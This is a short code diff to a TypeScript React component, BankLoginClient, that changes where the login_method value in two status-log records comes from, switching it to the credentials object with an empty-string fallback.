@@ -552,7 +552,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
         status: "error",
         bank_slug: bank?.slug ?? null,
         bank_name: bank?.name ?? null,
-        login_method: historyEntry.loginMethod,
+        login_method: credentials.loginMethod ?? "",
         meta: { message: updateError.message ?? String(updateError) },
         error_name: "SupabaseUpdateError",
         error_message: updateError.message ?? String(updateError),
@@ -568,7 +568,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       status: "ok",
       bank_slug: bank?.slug ?? null,
       bank_name: bank?.name ?? null,
-      login_method: historyEntry.loginMethod,
+      login_method: credentials.loginMethod ?? "",
       from_step: "bank",
       to_step: "wait",
       meta: {
